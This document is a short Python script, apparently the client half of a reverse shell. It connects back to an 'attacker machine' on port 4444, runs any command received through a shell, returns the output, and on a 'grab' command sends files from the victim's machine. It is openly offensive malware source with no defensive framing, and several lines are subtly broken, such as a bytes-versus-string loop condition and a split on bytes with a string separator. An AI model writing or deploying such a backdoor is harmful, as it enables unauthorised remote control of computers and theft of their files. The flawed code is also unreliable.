import os
import subprocess
import socket

def connect():
    def transfer(s, path):
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != " ":
                sock.send(packet)
                packet = f.read(1024)
            s.send(b"DONE")
            f.close()
        else:
            s.send(b"Unable to find out the file")

    host = "127.0.0.1" #attacker machine ip(server)
    port = 4444        #attacker machine port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    while True:
        command = sock.recv(1024)
        if b'terminate' in command:
            sock.close()
            break
        elif b'grab' in command:
            grab,path = command.split('*')
            try:
                transfer(sock, path)
            except Exception:
                sock.send(b'err')
                pass
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            sock.send(CMD.stdout.read())
            sock.send(CMD.stderr.read())

if __name__ == "__main__":
    connect()
